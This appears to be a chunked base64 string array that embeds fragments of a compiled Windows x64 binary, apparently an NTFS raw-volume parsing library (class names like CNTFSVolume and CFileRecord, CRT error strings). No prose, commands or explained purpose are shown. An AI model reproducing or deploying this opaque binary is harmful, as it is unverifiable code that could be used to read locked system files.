xzPSSIvO6NC1///oS7X//7siAAAAiRjol6f//+ks////zMxIg+w4SINkJCAA6GX+//9Ig8Q4w0iJXCQISIl0JBBXSIPsQIvaSIvRSI1MJCBBi/lBi/DoGGz//0iLRCQoD7bTQIR8Ahl1HoX2dBRIi0QkIEiLiAgBAAAPtwRRI8brAjPAhcB0BbgBAAAAgHwkOAB0DEiLTCQwg6HIAAAA/UiLXCRQSIt0JFhIg8RAX8PMzMyL0UG5BAAAAEUzwDPJ6XL////MzEj32RvAg+ABw8zMzMzMzMzMzMzMzMzMzMzMZmYPH4QAAAAAAEiD7ChIiUwkMEiJVCQ4RIlEJEBIixJIi8Hoct7////Q6Jve//9Ii8hIi1QkOEiLEkG4AgAAAOhV3v//SIPEKMNIiwQkSIkBw7kCAAAA6eaA///MzEBTSIPsIEiL2UiFyXUKSIPEIFvpvAAAAOgvAAAAhcB0BYPI/+sg90MYAEAAAHQVSIvL6Jny//+LyOgiBgAA99gbwOsCM8BIg8QgW8NIiVwkCEiJdCQQV0iD7CCLQRgz9kiL2SQDPAJ1P/dBGAgBAAB0Nos5K3kQhf9+LehQ8v//SItTEESLx4vI6Mry//87x3UPi0MYhMB5D4Pg/YlDGOsHg0sYIIPO/0iLSxCDYwgAi8ZIi3QkOEiJC0iLXCQwSIPEIF/DzMzMuQEAAADpAgAAAMzMSIlcJAhIiXQkEEiJfCQYQVVBVkFXSIPsMESL8TP2M/+NTgHoFNb//5Az20GDzf+JXCQgOx0n9wAAfX5MY/tIiwUT9wAASosU+EiF0nRk9kIYg3Rei8vo/fD//5BIiwX19gAASosM+PZBGIN0M0GD/gF1Eui0/v//QTvFdCP/xol0JCTrG0WF9nUW9kEYAnQQ6Jf+//9BO8VBD0T9iXwkKEiLFbH2AABKixT6i8voKvH////D6Xb///+5AQAAAOhh1///QYP+AQ9E/ovHSItcJFBIi3QkWEiLfCRgSIPEMEFfQV5BXcPMzMzMzMzMzGZmDx+EAAAAAABIg+wQTIkUJEyJXCQITTPbTI1UJBhMK9BND0LTZUyLHCUQAAAATTvTcxZmQYHiAPBNjZs','ImrqAAAAOnY/v//M8BIi1wkM','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BAAAAcgAAAAAAAACoJQGAAQAAAIQAAAAAAAAAyCUBgAEAAACIAAAAAAAAANglAYABAAAAAAAAAAAAAAAAAAAAAAAAAHBlcm1pc3Npb24gZGVuaWVkAAAAAAAAAGZpbGUgZXhpc3RzAAAAAABubyBzdWNoIGRldmljZQAAZmlsZW5hbWUgdG9vIGxvbmcAAAAAAAAAZGV2aWNlIG9yIHJlc291cmNlIGJ1c3kAaW8gZXJyb3IAAAAAAAAAAGRpcmVjdG9yeSBub3QgZW1wdHkAAAAAAGludmFsaWQgYXJndW1lbnQAAAAAAAAAAG5vIHNwYWNlIG9uIGRldmljZQAAAAAAAG5vIHN1Y2ggZmlsZSBvciBkaXJlY3RvcnkAAAAAAAAAZnVuY3Rpb24gbm90IHN1cHBvcnRlZAAAbm8gbG9jayBhdmFpbGFibGUAAAAAAAAAbm90IGVub3VnaCBtZW1vcnkAAAAAAAAAcmVzb3VyY2UgdW5hdmFpbGFibGUgdHJ5IGFnYWluAABjcm9zcyBkZXZpY2UgbGluawAAAAAAAABvcGVyYXRpb24gY2FuY2VsZWQAAAAAAAB0b28gbWFueSBmaWxlcyBvcGVuAAAAAABwZXJtaXNzaW9uX2RlbmllZAAAAAAAAABhZGRyZXNzX2luX3VzZQAAYWRkcmVzc19ub3RfYXZhaWxhYmxlAAAAYWRkcmVzc19mYW1pbHlfbm90X3N1cHBvcnRlZAAAAABjb25uZWN0aW9uX2FscmVhZHlfaW5fcHJvZ3Jlc3MAAGJhZF9maWxlX2Rlc2NyaXB0b3IAAAAAAGNvbm5lY3Rpb25fYWJvcnRlZAAAAAAAAGNvbm5lY3Rpb25fcmVmdXNlZAAAAAAAAGNvbm5lY3Rpb25fcmVzZXQAAAAAAAAAAGRlc3RpbmF0aW9uX2FkZHJlc3NfcmVxdWlyZWQAAAAAYmFkX2FkZHJlc3MAAAAAAGhvc3RfdW5yZWFjaGFibGUAAAAAAAAAAG9wZXJhdGlvbl9pbl9wcm9ncmVzcwAAAGludGVycnVwdGVkAAAAAABpbnZhbGlkX2FyZ3VtZW50AAAAAAAAAABhbHJlYWR5X2Nvbm5lY3RlZAAAAAAAAAB0b29fbWFueV9maWxlc19vcGVuAAAAAABtZXNzYWdlX3NpemUAAAAA','w5AQDrvEiNTCRQ/xUfZQAAZkQ5pCSSAAAAD4RAAQAASIuEJJgAAABIhcAPhC8BAABMjXAETIl0JDhIYzBJA/ZIiXQkQEG/AAgAAEQ5OEQPTDi7AQAAAIlcJDBEOT1uTwEAfXNIi9dJi83opcv//0iLyEiJRCQoSIXAdQlEiz1NTwEA61JIY9NMjQXBOAEASYkE0EQBLTZPAQBJiwTQSAUACwAASDvIcypmx0EIAApIgwn/RIlhDIBhOIBmx0E5CgpEiWFQRIhhTEgDz0iJTCQo68f/w+uAQYv8RIlkJCBMjS1qOAEAQTv/fXVIiw5IjUECSIP4AXZPQfYGAXRJQfYGCHUK/xU+ZAAAhcB0OUhj30iLw0jB+AWD4x9Ia9tYSQNcxQBIiVwkKEiLBkiJA0GKBohDCEiNSxC6oA8AAP8VtGMAAP9DDP/HiXwkIEn/xkyJdCQ4SIPGCEiJdCRA64ZBi/xEiWQkIEnHx/7///+D/wMPjc4AAABMY/dJi95Ia9tYSAMdxzcBAEiJXCQoSIsDSIPAAkiD+AF2EA++QwgPuugHiEMI6ZAAAADGQwiBjUf/99gbyYPB9bj2////hf8PRMj/FbdiAABIi/BIjUgBSIP5AXZESIvI/xVpYwAAhcB0N0iJMw+2wIP4AnUJD75DCIPIQOsMg/gDdQoPvkMIg8gIiEMISI1LELqgDwAA/xXjYgAA/0MM6yEPvkMIg8hAiEMITIk7SIsFkj0BAEiFwHQISosE8ESJeBz/x4l8JCDpKf///7kLAAAA6DweAAAzwEyNnCTAAAAASYtbIEmLcyhJi3swTYtjOEmL40FfQV5BXcNIiVwkCEiJdCQQV0iD7CBIjT3GNgEAvkAAAABIix9Ihdt0N0iNgwALAADrHYN7DAB0CkiNSxD/FaBiAABIiwdIg8NYSAUACwAASDvYct5Iiw/oCtD//0iDJwBIg8cISP/OdbhIi1wkMEiLdCQ4SIPEIF/DzEiJXCQYSIl0JCBXSIPsMIM9Ak4BAAB1BeiX1f//SI09RDgBAEG4BAEAADPJSIvXxgU2OQEAAP8VNGIAAEiLHd1NAQBIiT1GLwEASIXbdAWAOwB1A0iL30iNRCRITI1MJEBFM8Az0kiLy0iJRCQg6IEAAABIY3QkQEi5/////////x9IO/FzWUhjTCRISIP5/3NOSI0U8Ug70XJFSI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DorOv//0iJBU0wAQC5DAAAAOjvMwAASIPEIF/DzEiLxEiJWBBIiXAYSIl4IFVIjahI+///SIHssAUAAEiLBfcnAQBIM8RIiYWgBAAAQYv4i/KL2YP5/3QF6ND4//+DZCQwAEiNTCQ0M9JBuJQAAADoNQ8AAEiNRCQwSI1N0EiJRCQgSI1F0EiJRCQo6KX4//9Ii4W4BAAASImFyAAAAEiNhbgEAACJdCQwSIPACIl8JDRIiUVoSIuFuAQAAEiJRCRA/xXKdgAASI1MJCCL+Oim/f//hcB1EIX/dQyD+/90B4vL6Eb4//9Ii42gBAAASDPM6IO9//9MjZwksAUAAEmLWxhJi3MgSYt7KEmL413DzMxIiQ2ZSwEAw0iJXCQISIlsJBBIiXQkGFdIg+wwSIvpSIsNeksBAEGL2UmL+EiL8v8VQ3YAAESLy0yLx0iL1kiLzUiFwHQXSItcJEBIi2wkSEiLdCRQSIPEMF9I/+BIi0QkYEiJRCQg6CQAAADMzMzMSIPsOEiDZCQgAEUzyUUzwDPSM8nof////0iDxDjDzMxIg+wouRcAAADojmMAAIXAdAe5BQAAAM0pQbgBAAAAuhcEAMBBjUgB6E/+//+5FwQAwEiDxCjpffz//8xIi8RIiVgQSIloGEiJcCCJSAhXSIPsIEiLykiL2ujeSwAAi0sYSGPw9sGCdRfoGg0AAMcACQAAAINLGCCDyP/pMgEAAPbBQHQN6P4MAADHACIAAADr4jP/9sEBdBmJewj2wRAPhIkAAABIi0MQg+H+SIkDiUsYi0MYiXsIg+Dvg8gCiUMYqQwBAAB1L+hbSgAASIPAMEg72HQO6E1KAABIg8BgSDvYdQuLzuh5SwAAhcB1CEiLy+hhVQAA90MYCAEAAA+EiwAAAIsrSItTECtrEEiNQgFIiQOLQyT/yIlDCIXtfhlEi8WLzuiaSwAAi/jrVYPJIIlLGOk/////jUYCg/gBdh5Ii85Ii8ZIjRXaSQEAg+EfSMH4BUhryVhIAwzC6wdIjQ1SMAEA9kEIIHQXM9KLzkSNQgLoZ1MAAEiD+P8PhPH+//9Ii0sQikQkMIgB6xa9AQAAAEiNVCQwi85Ei8XoIUsAAIv4O/0Phcf+//8PtkQkMEiLXCQ4SItsJEBIi3QkSEiDxCBf','GFibGUnAGBsb2NhbCB2ZnRhYmxlIGNvbnN0cnVjdG9yIGNsb3N1cmUnACBuZXdbXQAAAAAAACBkZWxldGVbXQAAAAAAAABgb21uaSBjYWxsc2lnJwAAYHBsYWNlbWVudCBkZWxldGUgY2xvc3VyZScAAAAAAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgbWFuYWdlZCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYGVoIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBlaCB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAGBkeW5hbWljIGluaXRpYWxpemVyIGZvciAnAAAAAAAAYGR5bmFtaWMgYXRleGl0IGRlc3RydWN0b3IgZm9yICcAAAAAAAAAAGB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAABgdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAAABgbWFuYWdlZCB2ZWN0b3IgY29weSB','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